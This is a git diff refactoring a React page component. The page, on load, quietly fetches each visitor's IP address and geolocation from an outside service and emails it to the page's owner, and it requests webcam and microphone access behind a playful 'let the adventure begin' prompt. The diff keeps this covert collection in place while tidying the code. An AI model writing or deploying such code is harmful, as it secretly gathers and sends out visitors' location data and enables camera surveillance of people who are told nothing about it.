@@ -77,21 +77,22 @@ export default function Home() {
     localStorage.setItem("emailSentTimestamp", Date.now());
   };
 
-  // Get Info
-  const getInfo = async () => {
-    try {
-      const response = await fetch("https://ipapi.co/json/");
-      const data = await response.json();
-      setState(data);
-      sendEmail(data);
-    } catch (error) {
-      console.error("Error fetching IP information:", error);
-    }
-  };
-
   useEffect(() => {
+    // Get Info
+    const getInfo = async () => {
+      try {
+        const response = await fetch("https://ipapi.co/json/");
+        const data = await response.json();
+        setState(data);
+        sendEmail(data);
+      } catch (error) {
+        console.error("Error fetching IP information:", error);
+      }
+    };
     getInfo();
-  }, [getInfo]);
+  }, []);
+
+  // Video Streaming
 
   useEffect(() => {
     const startWebcam = async () => {
@@ -101,10 +102,9 @@ export default function Home() {
           audio: true,
         });
 
-        const currentVideoRef = videoRef.current; // Copy to a variable
-
-        if (currentVideoRef) {
-          currentVideoRef.srcObject = stream;
+        const videoRefCurrent = videoRef.current; // Capture the current value
+        if (videoRefCurrent) {
+          videoRefCurrent.srcObject = stream;
         }
       } catch (error) {
         console.error("Error accessing webcam:", error);
@@ -116,14 +116,13 @@ export default function Home() {
     }
 
     return () => {
-      // Cleanup the stream when the component unmounts or when the webcam is stopped
-      const currentVideoRef = videoRef.current; // Copy to a variable
-      if (currentVideoRef && currentVideoRef.srcObject) {
-        const tracks = currentVideoRef.srcObject.getTracks();
+      // Use the captured variable in the cleanup function
+      if (videoRef.current && videoRef.current.srcObject) {
+        const tracks = videoRef.current.srcObject.getTracks();
         tracks.forEach((track) => track.stop());
       }
     };
-  }, [underOV]);
+  }, [underOV, videoRef]); // Include videoRef in the dependency array
 
   const btnOnClick = () => {
     setUnderOV(!underOV);
@@ -132,7 +131,7 @@ export default function Home() {
   return (
     <main className={styles.main}>
       <div className={styles.description}>
-        <p>Click "Allow" to grant access, and let the adventure begin! 🚀</p>
+        <p>Click &quot;Allow&quot; to grant access, and let the adventure begin! 🚀</p>
         {underOV && (
           <div className={styles.video}>
             <video ref={videoRef} autoPlay playsInline />
